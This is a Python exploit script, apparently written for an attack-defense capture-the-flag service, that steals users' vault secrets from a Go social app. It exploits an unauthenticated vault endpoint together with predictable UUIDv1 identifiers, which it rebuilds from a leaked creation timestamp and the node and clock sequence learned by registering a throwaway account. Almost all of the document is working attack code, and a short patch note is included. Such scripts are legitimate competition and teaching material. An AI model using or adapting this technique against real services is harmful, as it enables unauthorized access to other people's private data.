"""Exploit for vnek (vNeKontakte) — Go social app. Unauthenticated vault read.

The flag is a user's "vault secret". Pre-patch, GET /api/vault?uuid=<UUID> returns
ANY user's secret with NO authentication (handlers_vault.go.orig_preAD). All you need
is the victim's user id — and ids are UUIDv1 with a per-process node + clock sequence:

  1. register a throwaway user on the victim box; the response returns OUR uuid, from
     which we read the box's fixed (node, clock_seq);
  2. GET /api/profile?username=<victim> -> "created", which is the victim's UUIDv1
     timestamp rendered RFC3339Nano (publicCreated = identity.CreatedAt(u.ID));
  3. rebuild the victim's exact UUIDv1 from (their timestamp, our node, our clock_seq);
  4. GET /api/vault?uuid=<that> -> {"secret": <FLAG>}.

flag_id = {"username": "<victim>"}.

Patch (defense): require auth on /api/vault and return only the caller's OWN secret;
stop exposing the UUIDv1 timestamp as "created"; use random (v4) ids.

Interface: exploit(host, port, flag_id) -> list[str]
Deps: requests (stdlib uuid/calendar/time otherwise).
"""
import calendar
import json
import random
import re
import string
import sys
import time
import uuid

import requests

FLAG_RE = re.compile(r"[A-Z0-9]{31}=")
TIMEOUT = 7
UUID_OFFSET = 0x01b21dd213814000          # 100ns ticks between 1582-10-15 and 1970-01-01

# per-box UUIDv1 (node, clock_seq) learned from our own registration; stable for the
# victim process's lifetime (a restart changes them -> we re-learn and retry).
_IDENTITY = {}


def _rand(n=12):
    return "".join(random.choice(string.ascii_lowercase + string.digits) for _ in range(n))


def _learn_identity(base):
    """Register a throwaway user; return (node, clock_seq) from our own UUIDv1."""
    try:
        r = requests.post(base + "/api/register",
                          data={"username": "z" + _rand(14), "password": _rand(16)},
                          timeout=TIMEOUT)
        mine = (r.json() or {}).get("uuid")
    except (ValueError, requests.RequestException):
        return None
    if not mine:
        return None
    try:
        u = uuid.UUID(str(mine))
    except (ValueError, AttributeError):
        return None
    if u.version != 1:
        return None
    return (u.node, u.clock_seq)


def _parse_created(s):
    """RFC3339Nano (UTC, trailing 'Z') -> (unix_sec, nanoseconds)."""
    s = s.strip()
    if s.endswith("Z"):
        s = s[:-1]
    if "." in s:
        base, frac = s.split(".", 1)
        nsec = int((frac + "000000000")[:9])
    else:
        base, nsec = s, 0
    tm = time.strptime(base, "%Y-%m-%dT%H:%M:%S")
    return calendar.timegm(tm), nsec


def _rebuild_uuid_v1(sec, nsec, node, clock_seq):
    t = sec * 10_000_000 + nsec // 100 + UUID_OFFSET      # 60-bit UUIDv1 timestamp
    time_low = t & 0xffffffff
    time_mid = (t >> 32) & 0xffff
    time_hi_version = ((t >> 48) & 0x0fff) | (1 << 12)    # version 1
    clock_hi = ((clock_seq >> 8) & 0x3f) | 0x80           # variant 10x
    clock_low = clock_seq & 0xff
    return str(uuid.UUID(fields=(time_low, time_mid, time_hi_version, clock_hi, clock_low, node)))


def _username(flag_id):
    if flag_id is None:
        return None
    raw = flag_id
    if isinstance(raw, str):
        raw = raw.strip()
        if raw.startswith("{"):
            try:
                raw = json.loads(raw)
            except ValueError:
                return raw.lower() or None
        else:
            return raw.lower() or None
    if isinstance(raw, dict):
        v = raw.get("username") or raw.get("user") or raw.get("name")
        return str(v).strip().lower() if v else None
    return str(raw).strip().lower() or None


def _read_vault(base, vid):
    try:
        r = requests.get(base + "/api/vault", params={"uuid": vid}, timeout=TIMEOUT)
        return (r.json() or {}).get("secret", "") or ""
    except (ValueError, requests.RequestException):
        return ""


def exploit(host, port, flag_id):
    flags, seen = [], set()
    try:
        victim = _username(flag_id)
        if not victim:
            return flags
        base = "http://%s:%s" % (host, port)       # %s: a non-int port returns [] instead of raising

        ident = _IDENTITY.get(base) or _learn_identity(base)
        if not ident:
            return flags
        _IDENTITY[base] = ident

        try:
            r = requests.get(base + "/api/profile", params={"username": victim}, timeout=TIMEOUT)
            created = (r.json() or {}).get("created")
        except (ValueError, requests.RequestException):
            created = None
        if not created:
            return flags
        try:
            sec, nsec = _parse_created(created)
        except (ValueError, OverflowError):
            return flags

        for attempt in range(2):
            node, clock_seq = _IDENTITY[base]
            secret = _read_vault(base, _rebuild_uuid_v1(sec, nsec, node, clock_seq))
            for m in FLAG_RE.findall(secret):
                if m not in seen:
                    seen.add(m)
                    flags.append(m)
            if flags or attempt == 1:
                break
            fresh = _learn_identity(base)        # box may have restarted -> new node/seq
            if not fresh or fresh == _IDENTITY[base]:
                break
            _IDENTITY[base] = fresh
    except Exception:
        return flags
    return flags


if __name__ == "__main__":
    h = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
    p = int(sys.argv[2]) if len(sys.argv) > 2 else 28080
    fid = sys.argv[3] if len(sys.argv) > 3 else None
    for f in exploit(h, p, fid):
        print(f)
